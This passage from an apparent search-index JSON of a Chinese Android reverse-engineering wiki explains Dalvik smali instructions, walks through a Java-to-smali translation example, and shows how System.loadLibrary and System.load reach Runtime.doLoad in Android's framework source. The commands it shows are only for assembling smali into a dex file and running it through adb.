\u8df3\u8f6c\u8868\u5f00\u59cb .packed-switch 0x0 # \u4ece 0 \u5f00\u59cb :pswitch_0 :pswitch_1 :pswitch_2 :pswitch_3 .end packed-switch # \u8df3\u8f6c\u8868\u7ed3\u675f \u5bf9\u4e8e\u975e\u9012\u589e\u7684switch\uff0c\u4ee3\u7801\u5982\u4e0b int a = 10 ; switch ( a ){ case 0 : a = 1 ; break; case 10 : a = 5 ; break; case 20 : a = 10 ; break; case 30 : a = 20 ; break; } \u5bf9\u5e94\u7684smali\u5982\u4e0b const/16 v0 , 0xa sparse-switch v0 , :sswitch_data_0 # switch \u5f00\u59cb :sswitch_0 # case 0 const/4 v0 , 0x1 goto :goto_0 :sswitch_1 # case 10 const/4 v0 , 0x5 goto :goto_0 :sswitch_2 # case 20 const/16 v0 , 0xa goto :goto_0 :sswitch_3 # case 15 const/16 v0 , 0x14 goto :goto_0 :goto_0 # switch \u7ed3\u675f return-void .line 55 :sswitch_data_0 # \u8df3\u8f6c\u8868\u5f00\u59cb .sparse-switch 0x0 -> :sswitch_0 0xa -> :sswitch_1 0x14 -> :sswitch_2 0x1e -> :sswitch_3 .end sparse-switch # \u8df3\u8f6c\u8868\u7ed3\u675f","title":"switch\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_33","text":"\u9501\u6307\u4ee4\u7528\u4e8e\u5728\u591a\u7ebf\u7a0b\u7a0b\u5e8f\u3002\u5305\u542b\u4ee5\u4e0b\u4e24\u4e2a\u6307\u4ee4 \u6307\u4ee4 \u8bf4\u660e monitor-enter vAA \u4e3a\u6307\u5b9a\u7684\u5bf9\u8c61\u83b7\u53d6\u9501 monitor-exit vAA \u91ca\u653e\u6307\u5b9a\u7684\u5bf9\u8c61\u7684\u9501","title":"\u9501\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_34","text":"\u65b9\u6cd5\u8c03\u7528\u6307\u4ee4\u5b9e\u73b0\u4e86\u8c03\u7528\u5b9e\u4f8b\u7684\u65b9\u6cd5\u7684\u64cd\u4f5c\u3002\u5176\u57fa\u7840\u4e3ainvoke\uff0c\u5728\u5176\u57fa\u7840\u4e0a\u4f1a\u6839\u636e\u8c03\u7528\u65b9\u6cd5\u7684\u7c7b\u522b\u4e0d\u540c\uff0c\u5982\u865a\u65b9\u6cd5\uff0c\u7236\u7c7b\u65b9\u6cd5\u7b49\u6dfb\u52a0\u540e\u7f00\uff0c\u6700\u540e\u4f1a\u9009\u62e9\u6027\u5730\u4f7f\u7528range\u6765\u6307\u5b9a\u5bc4\u5b58\u5668\u8303\u56f4\u3002\u4e00\u822c\u6765\u8bf4\u4f1a\u5206\u4e3a\u4e24\u7c7b invoke-kind {vC, vD, vE, vF, vG},meth@BBBB invoke-kind/range {vCCCC .. vNNNN},meth@BBBB\u4e24\u7c7b \u603b\u4f53\u6765\u8bf4\uff0c\u4e00\u822c\u6709\u5982\u4e0b\u6307\u4ee4 \u6307\u4ee4 \u8bf4\u660e invoke-virtual \u6216 invoke-virtual/range \u8c03\u7528\u5b9e\u4f8b\u7684\u865a\u65b9\u6cd5 invoke-super \u6216 invoke-super/range \u8c03\u7528\u5b9e\u4f8b\u7684\u7236\u7c7b\u65b9\u6cd5 invoke-direct \u6216 invoke-direct/range \u8c03\u7528\u5b9e\u4f8b\u7684\u76f4\u63a5\u65b9\u6cd5 invoke-static \u6216 invoke-static/range \u8c03\u7528\u5b9e\u4f8b\u7684\u9759\u6001\u65b9\u6cd5 invoke-interface \u6216 invoke-interface/range \u8c03\u7528\u5b9e\u4f8b\u7684\u63a5\u53e3\u65b9\u6cd5 Dalvik\u4e2d\u76f4\u63a5\u65b9\u6cd5\u662f\u6307\u7c7b\u7684\u6240\u6709\u5b9e\u4f8b\u6784\u9020\u5668\u548c private \u5b9e\u4f8b\u65b9\u6cd5\uff0c\u5bf9\u4e8e protected \u6216\u8005 public \u65b9\u6cd5\u90fd\u53eb\u505a\u865a\u65b9\u6cd5\u3002","title":"\u65b9\u6cd5\u8c03\u7528\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_35","text":"\u5229\u7528 throw vAA \u6307\u4ee4\u629b\u51favAA\u5bc4\u5b58\u5668\u4e2d\u6307\u5b9a\u7c7b\u578b\u7684\u5f02\u5e38\u3002","title":"\u5f02\u5e38\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#try-catch","text":"\u9996\u5148\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0btry catch\uff0c\u5982\u4e0b int a = 10 ; try { callSomeMethod (); } catch ( Exception e ) { a = 0 ; } callAnotherMethod (); \u5bf9\u5e94\u7684smali\u5982\u4e0b const/16 v0 , 0xa :try_start_0 # try \u5757\u5f00\u59cb invoke-direct { p0 }, L net/flygon/myapplication/ SubActivity ; -> callSomeMethod () V :try_end_0 # try \u5757\u7ed3\u675f .catch L java/lang/ Exception ; { :try_start_0 .. :try_end_0 } :catch_0 :goto_0 invoke-direct { p0 }, L net/flygon/myapplication/ SubActivity ; -> callAnotherMethod () V return-void :catch_0 # catch \u5757\u5f00\u59cb move-exception v1 const/4 v0 , 0x0 goto :goto_0 # catch \u5757\u7ed3\u675f \u53ef\u4ee5\u770b\u5230\uff0c :try_start_0 \u548c :try_end_0 \u4e4b\u95f4\u5982\u679c\u5b58\u5728\u5f02\u5e38\uff0c\u5219\u4f1a\u5411\u4e0b\u5bfb\u627e .catch \uff08\u6216\u8005 .catch-all \uff09\u8bed\u53e5\uff0c\u7b26\u5408\u6761\u4ef6\u65f6\u8df3\u5230\u6807\u7b7e\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u662f :catch_0 \uff0c\u7ed3\u675f\u4e4b\u540e\u4f1a\u6709\u4e2a goto \u8df3\u56de\u53bb\u3002","title":"try catch"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#try-finally","text":"java\u4ee3\u7801\u5982\u4e0b int a = 10 ; try { callSomeMethod (); } finally { a = 0 ; } callAnotherMethod (); \u5176\u5bf9\u5e94\u7684smali\u4ee3\u7801\u5982\u4e0b const/16 v0 , 0xa :try_start_0 # try \u5757\u5f00\u59cb invoke-direct { p0 }, L net/flygon/myapplication/ SubActivity ; -> callSomeMethod () V :try_end_0 # try \u5757\u7ed3\u675f .catchall { :try_start_0 .. :try_end_0 } :catchall_0 const/4 v0 , 0x0 # \u590d\u5236\u4e00\u4efd\u5230\u5916\u9762 invoke-direct { p0 }, L net/flygon/myapplication/ SubActivity ; -> callAnotherMethod () V return-void :catchall_0 # finally \u5757\u5f00\u59cb move-exception v1 const/4 v0 , 0x0 throw v1 # finally \u5757\u7ed3\u675f \u53ef\u4ee5\u770b\u51fa\uff0c\u7531\u4e8e finally \u4e2d\u7684\u903b\u8f91\u65e0\u8bba\u6709\u6ca1\u6709\u5f02\u5e38\u90fd\u4f1a\u6267\u884c\uff0c\u6240\u4ee5\u4ee3\u7801\u91cc\u4e00\u5171\u6709\u4e24\u90e8\u5206\u3002","title":"try-finally"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#try-catch-finally","text":"\u5f53\u6211\u4eec\u540c\u65f6\u4f7f\u7528catch\u4e0efinally\u65f6\uff0c\u5982\u4e0b int a = 10 ; try { callSomeMethod (); } catch ( Exception e ) { a = 1 ; } finally { a = 0 ; } callAnotherMethod (); \u5176\u5bf9\u5e94\u7684smali\u4ee3\u7801\u5982\u4e0b const/16 v0 , 0xa :try_start_0 # try \u5757\u5f00\u59cb invoke-direct { p0 }, L net/flygon/myapplication/ SubActivity ; -> callSomeMethod () V :try_end_0 # try \u5757\u7ed3\u675f .catch L java/lang/ Exception ; { :try_start_0 .. :try_end_0 } :catch_0 .catchall { :try_start_0 .. :try_end_0 } :catchall_0 const/4 v0 , 0x0 # \u590d\u5236\u4e00\u4efd\u5230\u5916\u9762 :goto_0 invoke-direct { p0 }, L net/flygon/myapplication/ SubActivity ; -> callAnotherMethod () V return-void :catch_0 # catch \u5757\u5f00\u59cb move-exception v1 const/4 v0 , 0x1 const/4 v0 , 0x0 # \u590d\u5236\u4e00\u4efd\u5230 catch \u5757\u91cc\u9762 goto :goto_0 # catch \u5757\u7ed3\u675f :catchall_0 # finally \u5757\u5f00\u59cb move-exception v2 const/4 v0 , 0x0 throw v2 # finally \u5757\u7ed3\u675f","title":"try-catch-finally"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_36","text":"\u5728java\u4e2d\u6211\u4eec\u4f1a\u5229\u7528Return\u8fd4\u56de\u65b9\u6cd5\u7684\u6267\u884c\u7ed3\u679c\u3002\u540c\u6837\u7684\uff0c\u5728Davilk\u4e2d\u6211\u4eec\u4e5f\u9700\u8981return\u6307\u4ee4\u6765\u8fd4\u56de\u65b9\u6cd5\u8fd0\u884c\u7ed3\u679c\u3002 \u6307\u4ee4 \u8bf4\u660e return-void \u4ec0\u4e48\u4e5f\u4e0d\u8fd4\u56de return vAA \u8fd4\u56de\u4e00\u4e2a32\u4f4d\u975e\u5bf9\u8c61\u7c7b\u578b\u7684\u503c return-wide vAA \u8fd4\u56de\u4e00\u4e2a64\u4f4d\u975e\u5bf9\u8c61\u7c7b\u578b\u7684\u503c return-object vAA \u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\u7c7b\u578b\u7684\u5f15\u7528","title":"\u8fd4\u56de\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#java2smali","text":"\uff01\uff01\u4ecejava\u4ee3\u7801\u5230smali\u4ee3\u7801\uff01\uff01 \u8be5\u4f8b\u5b50\u6765\u81ea\u4e8e http://blog.csdn.net/dd864140130/article/details/52076515 \u3002 java\u4ee3\u7801\u5982\u4e0b public class MainActivity extends Activity implements View . OnClickListener { private String TAG = \"MainActivity\" ; private static final float pi = ( float ) 3.14 ; public volatile boolean running = false ; @Override protected void onCreate ( Bundle savedInstanceState ) { super . onCreate ( savedInstanceState ); setContentView ( R . layout . activity_main ); } @Override public void onClick ( View view ) { int result = add ( 4 , 5 ); System . out . println ( result ); result = sub ( 9 , 3 ); if ( result > 4 ) { log ( result ); } } public int add ( int x , int y ) { return x + y ; } public synchronized int sub ( int x , int y ) { return x + y ; } public static void log ( int result ) { Log . d ( \"MainActivity\" , \"the result:\" + result ); } } \u5176\u5bf9\u5e94\u7684smali\u4ee3\u7801\u5982\u4e0b #\u6587\u4ef6\u5934\u63cf\u8ff0 .class public L com/social_touch/demo/ MainActivity ; .super L android/app/ Activity ; #\u6307\u5b9aMainActivity\u7684\u7236\u7c7b .source \"MainActivity.java\" #\u6e90\u6587\u4ef6\u540d\u79f0 #\u8868\u660e\u5b9e\u73b0\u4e86View.OnClickListener\u63a5\u53e3 # interfaces .implements L android/view/ View$OnClickListener ; #\u5b9a\u4e49float\u9759\u6001\u5b57\u6bb5pi # static fields .field private static final pi : F = 3.14f #\u5b9a\u4e49\u4e86String\u7c7b\u578b\u5b57\u6bb5TAG # instance fields .field private TAG : L java/lang/ String ; #\u5b9a\u4e49\u4e86boolean\u7c7b\u578b\u7684\u5b57\u6bb5running .field public volatile running : Z #\u6784\u9020\u65b9\u6cd5,\u5982\u679c\u4f60\u8fd8\u7eb3\u95f7\u8fd9\u4e2a\u65b9\u6cd5\u662f\u600e\u4e48\u51fa\u6765\u7684\u5316,\u5c31\u53bb\u770b\u770bjvm\u7684\u57fa\u7840\u77e5\u8bc6\u5427 # direct methods .method public constructor <init> () V .locals 1 #\u8868\u793a\u51fd\u6570\u4e2d\u4f7f\u7528\u4e86\u4e00\u4e2a\u5c40\u90e8\u53d8\u91cf .prologue #\u8868\u793a\u65b9\u6cd5\u4e2d\u4ee3\u7801\u6b63\u5f0f\u5f00\u59cb .line 8 #\u8868\u793a\u5bf9\u5e94\u4e0ejava\u6e90\u6587\u4ef6\u7684\u4f4e8\u884c #\u8c03\u7528Activity\u4e2d\u7684init()\u65b9\u6cd5 invoke-direct { p0 }, L android/app/ Activity ; -> <init> () V .line 10 const-string v0 , \"MainActivity\" iput-object v0 , p0 , L com/social_touch/demo/ MainActivity ; -> TAG : L java/lang/ String ; .line 13 const/4 v0 , 0x0 iput-boolean v0 , p0 , L com/social_touch/demo/ MainActivity ; -> running : Z return-void .end method #\u9759\u6001\u65b9\u6cd5log() .method public static log ( I ) V .locals 3 .parameter \"result\" #\u8868\u793aresult\u53c2\u6570 .prologue .line 42 #v0\u5bc4\u5b58\u5668\u4e2d\u8d4b\u503c\u4e3a\"MainActivity\" const-string v0 , \"MainActivity\" #\u521b\u5efaStringBuilder\u5bf9\u8c61,\u5e76\u5c06\u5176\u5f15\u7528\u8d4b\u503c\u7ed9v1\u5bc4\u5b58\u5668 new-instance v1 , L java/lang/ StringBuilder ; #\u8c03\u7528StringBuilder\u4e2d\u7684\u6784\u9020\u65b9\u6cd5 invoke-direct { v1 }, L java/lang/ StringBuilder ; -> <init> () V #v2\u5bc4\u5b58\u5668\u4e2d\u8d4b\u503c\u4e3ather result: const-string v2 , \"the result:\" #{v1,v2}\u5927\u62ec\u53f7\u4e2dv1\u5bc4\u5b58\u5668\u4e2d\u5b58\u50a8\u7684\u662fStringBuilder\u5bf9\u8c61\u7684\u5f15\u7528. #\u8c03\u7528StringBuilder\u4e2d\u7684append(String str)\u65b9\u6cd5,v2\u5bc4\u5b58\u5668\u5219\u662f\u53c2\u6570\u5bc4\u5b58\u5668. invoke-virtual { v1 , v2 }, L java/lang/ StringBuilder ; -> append ( L java/lang/ String ; ) L java/lang/ StringBuilder ; #\u83b7\u53d6\u4e0a\u4e00\u4e2a\u65b9\u6cd5\u7684\u6267\u884c\u7ed3\u679c,\u6b64\u65f6v1\u4e2d\u5b58\u50a8\u7684\u662fappend()\u65b9\u6cd5\u6267\u884c\u540e\u7684\u7ed3\u679c,\u6b64\u5904\u4e4b\u6240\u4ee5\u4ecd\u7136\u8fd4\u56dev1\u7684 #\u539f\u56e0\u5728\u4e0eappend()\u65b9\u6cd5\u8fd4\u56de\u7684\u5c31\u662f\u81ea\u8eab\u7684\u5f15\u7528 move-result-object v1 #\u7ee7\u7eed\u8c03\u7528append\u65b9\u6cd5(),p0\u8868\u793a\u7b2c\u4e00\u4e2a\u53c2\u6570\u5bc4\u5b58\u5668,\u5373\u4e0a\u9762\u63d0\u5230\u7684result\u53c2\u6570 invoke-virtual { v1 , p0 }, L java/lang/ StringBuilder ; -> append ( I ) L java/lang/ StringBuilder ; #\u540c\u4e0a move-result-object v1 #\u8c03\u7528StringBuilder\u5bf9\u8c61\u7684toString()\u65b9\u6cd5 invoke-virtual { v1 }, L java/lang/ StringBuilder ; -> toString () L java/lang/ String ; #\u83b7\u53d6\u4e0a\u4e00\u4e2a\u65b9\u6cd5\u6267\u884c\u7ed3\u679c,toString()\u65b9\u6cd5\u8fd4\u56de\u4e86\u4e00\u4e2a\u65b0\u7684String\u5bf9\u8c61,\u56e0\u6b64v1\u4e2d\u6b64\u65f6\u5b58\u50a8\u4e86String\u5bf9\u8c61\u7684\u5f15\u7528 move-result-object v1 #\u8c03\u7528Log\u7c7b\u4e2d\u7684\u9759\u6001\u65b9\u6cd5e().\u56e0\u4e3ae()\u662f\u9759\u6001\u65b9\u6cd5,\u56e0\u6b64{v0,v1}\u4e2d\u7684\u6210\u4e86\u53c2\u6570\u5bc4\u5b58\u5668 invoke-static { v0 , v1 }, L android/util/ Log ; -> d ( L java/lang/ String ; L java/lang/ String ; ) I .line 43 #\u8c03\u7528\u8fd4\u56de\u6307\u4ee4,\u6b64\u5904\u6ca1\u6709\u8fd4\u56de\u4efb\u4f55\u503c return-void .end method # virtual methods .method public add ( II ) I .locals 1 .parameter \"x\" #\u7b2c\u4e00\u4e2a\u53c2\u6570 .parameter \"y\" #\u7b2c\u4e8c\u4e2a\u53c2\u6570 .prologue .line 34 #\u8c03\u7528add-int\u6307\u4ee4\u6c42\u548c\u4e4b\u540e\u5c06\u7ed3\u679c\u8d4b\u503c\u7ed9v0\u5bc4\u5b58\u5668 add-int v0 , p1 , p2 #\u8fd4\u56dev0\u5bc4\u5b58\u5668\u4e2d\u7684\u503c return v0 .end method .method public onClick ( L android/view/ View ; ) V .locals 4 .parameter \"view\" #\u53c2\u6570view .prologue const/4 v3 , 0x4 #v3\u5bc4\u5b58\u5668\u4e2d\u8d4b\u503c\u4e3a4 .line 23 #java\u6e90\u6587\u4ef6\u4e2d\u7684\u7b2c23\u884c const/4 v1 , 0x5 #v1\u5bc4\u5b58\u5668\u4e2d\u8d4b\u503c\u4e3a5 #\u8c03\u7528add()\u65b9\u6cd5 invoke-virtual { p0 , v3 , v1 }, L com/social_touch/demo/ MainActivity ; -> add ( II ) I #\u4ecev0\u5bc4\u5b58\u5668\u4e2d\u83b7\u53d6add\u65b9\u6cd5\u7684\u6267\u884c\u7ed3\u679c move-result v0 .line 24 #java\u6e90\u6587\u4ef6\u4e2d\u768424\u884c .local v0 , result : I #v1\u5bc4\u5b58\u5668\u4e2d\u8d4b\u503c\u4e3aPrintStream\u5bf9\u8c61\u7684\u5f15\u7528out sget-object v1 , L java/lang/ System ; -> out : L java/io/ PrintStream ; #\u6267\u884cout\u5bf9\u8c61\u7684println()\u65b9\u6cd5 invoke-virtual { v1 , v0 }, L java/io/ PrintStream ; -> println ( I ) V .line 26 const/16 v1 , 0x9 #v1\u5bc4\u5b58\u5668\u4e2d\u8d4b\u503c\u4e3a9 const/4 v2 , 0x3 #v2\u5bc4\u5b58\u5668\u4e2d\u8d4b\u503c\u4e3a3 #\u8c03\u7528sub()\u65b9\u6cd5,{p0,v1,v2},p0\u6307\u7684\u662fthis,\u5373\u5f53\u524d\u5bf9\u8c61,v1,v2\u5219\u662f\u53c2\u6570 invoke-virtual { p0 , v1 , v2 }, L com/social_touch/demo/ MainActivity ; -> sub ( II ) I #\u4ecev0\u5bc4\u5b58\u5668\u4e2d\u83b7\u53d6sub()\u65b9\u6cd5\u7684\u6267\u884c\u7ed3\u679c move-result v0 .line 28 if-le v0 , v3 , :cond_0 #\u5982\u679cv0\u5bc4\u5b58\u5668\u7684\u503c\u5c0f\u4e8ev3\u5bc4\u5b58\u5668\u4e2d\u7684\u503c,\u5219\u8df3\u8f6c\u5230cond_0\u5904\u7ee7\u7eed\u6267\u884c .line 29 #\u8c03\u7528\u9759\u6001\u65b9\u6cd5log() invoke-static { v0 }, L com/social_touch/demo/ MainActivity ; -> log ( I ) V .line 31 :cond_0 return-void .end method .method protected onCreate ( L android/os/ Bundle ; ) V .locals 1 .parameter \"savedInstanceState\" #\u53c2\u6570savedInstancestate .prologue .line 17 #\u8c03\u7528\u7236\u7c7b\u65b9\u6cd5onCreate() invoke-super { p0 , p1 }, L android/app/ Activity ; -> onCreate ( L android/os/ Bundle ; ) V .line 18 const v0 , 0x7f04001a #v0\u5bc4\u5b58\u5668\u8d4b\u503c\u4e3a0x7f04001a #\u8c03\u7528\u65b9\u6cd5setContentView() invoke-virtual { p0 , v0 }, L com/social_touch/demo/ MainActivity ; -> setContentView ( I ) V .line 19 return-void .end method #declared-synchronized\u8868\u793a\u8be5\u65b9\u6cd5\u662f\u540c\u6b65\u65b9\u6cd5 .method public declared-synchronized sub ( II ) I .locals 1 .parameter \"x\" .parameter \"y\" .prologue .line 38 monitor-enter p0 #\u4e3a\u8be5\u65b9\u6cd5\u6dfb\u52a0\u9501\u5bf9\u8c61p0 add-int v0 , p1 , p2 #\u91ca\u653e\u9501\u5bf9\u8c61 monitor-exit p0 return v0 .end method","title":"java2smali"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#-smali2dex","text":"\u7ed9\u5b9a\u4e00\u4e2a smali \u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u65b9\u5f0f\u5c06 smali \u6587\u4ef6\u7f16\u8bd1\u4e3a dex \u6587\u4ef6\u3002 java -jar smali.jar assemble src.smali -o src.dex \u5176\u4e2d\uff0csmali.jar \u6765\u81ea\u4e8e https://bitbucket.org/JesusFreke/smali/overview \u3002","title":"\u7f16\u8bd1-smali2dex"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#smali_1","text":"\u5728\u5c06 smali \u6587\u4ef6\u7f16\u8bd1\u6210 dex \u6587\u4ef6\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u4e00\u6b65\u6267\u884c \u9996\u5148\uff0c\u4f7f\u7528 adb \u5c06 dex \u6587\u4ef6 push \u5230\u624b\u673a\u4e0a adb push main.dex /sdcard/ \u5176\u6b21\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u6267\u884c adb shell dalvikvm -cp /sdcard/main.dex main \u5176\u4e2d \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 dalvikvm \u547d\u4ee4\u3002 -cp \u6307\u7684\u662f classpath \u8def\u5f84\uff0c\u8fd9\u91cc\u5c31\u662f /sdcard/main.dex\u3002 main \u6307\u7684\u662f\u7c7b\u540d\u3002","title":"\u8fd0\u884c smali"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_37","text":"Android \u8f6f\u4ef6\u5b89\u5168\u4e0e\u9006\u5411\u5206\u6790 http://blog.csdn.net/wizardforcel/article/details/54730253 http://blog.csdn.net/dd864140130/article/details/52076515","title":"\u53c2\u8003\u9605\u8bfb"},{"location":"android/basic_operating_mechanism/native_layer/so/","text":"so \u4ecb\u7ecd \u00b6 \u57fa\u672c\u4ecb\u7ecd \u00b6 \u4e3a\u4ec0\u4e48\u4f1a\u7528\u5230 Shared Object(SO) \u5f00\u53d1\u6548\u7387 \u5feb\u901f\u79fb\u690d so \u7684\u7248\u672c \u6839\u636e CPU \u5e73\u53f0\u6709\u6240\u4e0d\u4e00\u6837 \u52a0\u8f7d\u65b9\u6cd5 \u00b6 System.loadLibrary \u5982\u679c\u52a0\u8f7d\u7684\u6587\u4ef6\u540d\u662f xxx \uff0c\u90a3\u4e48\u5176\u5b9e\u52a0\u8f7d\u7684\u662f\u9879\u76ee\u4e2d libs \u76ee\u5f55\u4e0b\u7684 libxxx.so\u6587\u4ef6\u3002 System.load \u5bf9\u5e94 lib \u7684\u7edd\u5bf9\u8def\u5f84\u3002 \u4e3b\u8981\u4f7f\u7528\u7b2c\u4e00\u79cd\u65b9\u5f0f\uff0c\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u4e3b\u8981\u7528\u4e8e\u5728\u63d2\u4ef6\u4e2d\u52a0\u8f7d so \u6587\u4ef6\u3002 loadLibrary \u52a0\u8f7d\u6d41\u7a0b \u00b6 \u6839\u636e\u5b98\u65b9 API \u4ecb\u7ecd The call System.loadLibrary(name) is effectively equivalent to the call Runtime.getRuntime().loadLibrary(name) \u53ef\u4ee5\u770b\u51fa\u8be5\u51fd\u6570\u5176\u5b9e\u8c03\u7528\u7684\u662f Runtime.java\uff08 libcore/luni/src/main/java/java/lang/Runtime.java \uff09\u4e2d\u7684\u51fd\u6570 loadLibrary\uff0c\u7ee7\u800c\u4f1a\u7ee7\u7eed\u8c03\u7528 loadLibrary \u53e6\u4e00\u4e2a\u91cd\u8f7d\u51fd\u6570\uff0c\u5b83\u5305\u542b\u4e24\u4e2a\u53c2\u6570 libame\uff0c\u6211\u4eec\u4f20\u5165\u7684\u5e93\u540d\u5b57 VMStack.getCallingClassLoader()\uff0c\u7c7b\u52a0\u8f7d\u5668 ClassLoader\uff0c\u65b9\u4fbf\u4e8e\u53bb\u5bfb\u627e\u76f8\u5e94\u7684 library\u3002 /** * Loads and links the library with the specified name. The mapping of the * specified library name to the full path for loading the library is * implementation-dependent. * * @param libName * the name of the library to load. * @throws UnsatisfiedLinkError * if the library can not be loaded. */ public void loadLibrary ( String libName ) { loadLibrary ( libName , VMStack . getCallingClassLoader ()); } /* * Searches for a library, then loads and links it without security checks. */ void loadLibrary ( String libraryName , ClassLoader loader ) { if ( loader != null ) { String filename = loader . findLibrary ( libraryName ); if ( filename == null ) { throw new UnsatisfiedLinkError ( \"Couldn't load \" + libraryName + \" from loader \" + loader + \": findLibrary returned null\" ); } String error = doLoad ( filename , loader ); if ( error != null ) { throw new UnsatisfiedLinkError ( error ); } return ; } String filename = System . mapLibraryName ( libraryName ); List < String > candidates = new ArrayList < String >(); String lastError = null ; for ( String directory : mLibPaths ) { String candidate = directory + filename ; candidates . add ( candidate ); if ( IoUtils . canOpenReadOnly ( candidate )) { String error = doLoad ( candidate , loader ); if ( error == null ) { return ; // We successfully loaded the library. Job done. } lastError = error ; } } if ( lastError != null ) { throw new UnsatisfiedLinkError ( lastError ); } throw new UnsatisfiedLinkError ( \"Library \" + libraryName + \" not found; tried \" + candidates ); } \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u4e3b\u8981\u7684\u529f\u80fd\u6b63\u5982\u6ce8\u91ca\u6240\u8bf4 Searches for a library, then loads and links it without security checks. \u800c\u5176\u4e2d\u6240\u91c7\u7528\u7684\u52a0\u8f7d\u51fd\u6570\u662f doLoad \u51fd\u6570\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u5148\u4e0d\u7ee7\u7eed\u5206\u6790\uff0c\u6211\u4eec\u6765\u770b\u770b load \u51fd\u6570\u5982\u4f55\u3002 load \u52a0\u8f7d\u6d41\u7a0b \u00b6 \u6839\u636e\u5b98\u65b9 API \u8bf4\u660e\uff0c\u5982\u4e0b The call System.load(name) is effectively equivalent to the call: java Runtime.getRuntime().load(name) \u5176\u540c\u6837\u4e5f\u662f\u8c03\u7528 Runtime.java \u4e2d\u7684\u51fd\u6570\uff0c\u5982\u4e0b /** * Loads and links the dynamic library that is identified through the * specified path. This method is similar to {@link #loadLibrary(String)}, * but it accepts a full path specification whereas {@code loadLibrary} just * accepts the name of the library to load. * * @param pathName * the absolute (platform dependent) path to the library to load. * @throws UnsatisfiedLinkError * if the library can not be loaded. */ public void load ( String pathName ) { load ( pathName , VMStack . getCallingClassLoader ()); } /* * Loads and links the given library without security checks. */ void load ( String pathName , ClassLoader loader ) { if ( pathName == null ) { throw new NullPointerException ( \"pathName == null\" ); } String error = doLoad ( pathName , loader ); if ( error != null ) { throw new UnsatisfiedLinkError ( error ); } } \u5176\u540c\u6837\u4e5f\u4f1a\u8c03\u7528load \u7684\u4e24\u4e2a\u53c2\u6570\u7684\u91cd\u8f7d\u51fd\u6570\uff0c\u7ee7\u800c\u4f1a\u8c03\u7528doLoad\u51fd\u6570\u3002 \u65e0\u8bba\u662f\u4e0a\u9762\u7684\u54ea\u4e00\u79cd\u52a0\u8f7d\u65b9\u6cd5\uff0c\u6700\u540e\u90fd\u4f1a\u8c03\u7528Runtime.java\u4e2d\u7684doLoad\u51fd\u6570\u3002 \u6838\u5fc3\u52a0\u8f7d\u6d41\u7a0b \u00b6 doLoad \u00b6 \u4e0b\u9762\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b doLoad \u51fd\u6570\uff0c\u5982\u4e0b private String doLoad ( String name , ClassLoader loader ) { // Android apps are forked from the zygote, so they can't have a custom LD_LIBRARY_PATH, // which means that by default an app's shared library directory isn't on LD_LIBRARY_PATH. // The PathClassLoader set up by frameworks/base knows the appropriate path, so we can load // libraries with no dependencies just fine, but an app that has multiple libraries that // depend on each other needed to load them in most-dependent-first order. // We added API to Android's dynamic linker so we can update the library path used for // the currently-running process. We pull the desired path out of the ClassLoader here // and pass it to nativeLoad so that it can call the private dynamic linker API. // We didn't just change frameworks/base to update the LD_LIBRARY_PATH once at the // beginning because multiple apks can run in the same process and third party code can // use its own BaseDexClassLoader. // We didn't just add a dlopen_with_custom_LD_LIBRARY_PATH call because we wanted any // dlopen(3) calls made from a .so's JNI_OnLoad to work too. // So, find out what the native library search path is for the ClassLoader in question... String ldLibraryPath = null ; if ( loader != null && loader instanceof BaseDexClassLoader ) { ldLibraryPath = (( BaseDexClassLoader ) loader ). getLdLibraryPath (); } // nativeLoad should be synchronized so there's only one LD_LIBRARY_PATH in use regardless // of how many ClassLoaders are in the system, but dalvik doesn't support synchronized // internal natives. synchronized ( this ) { return nativeLoad ( name , loader , ldLibraryPath ); } } \u867d\u7136\u6e90\u4ee3\u7801\u5f88\u957f\uff0c\u4f46\u662f\u5f88\u591a\u90e8\u5206\u90fd\u662f\u6ce8\u91ca\uff0c\u4e5f\u8bf4\u660e\u4e86\u4e3a\u4ec0\u4e48\u8981\u4f7f\u7528\u8fd9\u6837\u7684\u4e00\u4e2a\u51fd\u6570\u7684\u539f\u56e0\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u539f\u56e0 Android App \u90fd\u662f\u7531 zygote fork \u751f\u6210\u7684\uff0c\u56e0\u6b64\u4ed6\u4eec\u7684 LD_LIBRARY_PATH \u5c31\u662f zygote \u7684LD_LIBRARY_PATH\uff0c\u8fd9\u4e5f\u8bf4\u660e apk \u4e2d\u7684 so \u6587\u4ef6\u4e0d\u5728\u8fd9\u4e2a\u8def\u5f84\u4e0b\u3002 so \u6587\u4ef6\u4e4b\u95f4\u53ef\u80fd\u5b58\u5728\u76f8\u4e92\u4f9d\u8d56\uff0c\u6211\u4eec\u9700\u8981\u6309\u7167\u5176\u6309\u4f9d\u8d56\u5173\u7cfb\u7684\u9006\u65b9\u5411\u8fdb\u884c\u52a0\u8f7d\u3002 \u51fd\u6570\u7684\u57fa\u672c\u601d\u60f3\u5c31\u662f\u627e\u5230\u5e93\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u7136\u540e\u4f7f\u7528 synchronized \u65b9\u5f0f\u8c03\u7528\u4e86 nativeLoad \u51fd\u6570\u3002 nativeload \u00b6 \u800c nativeload 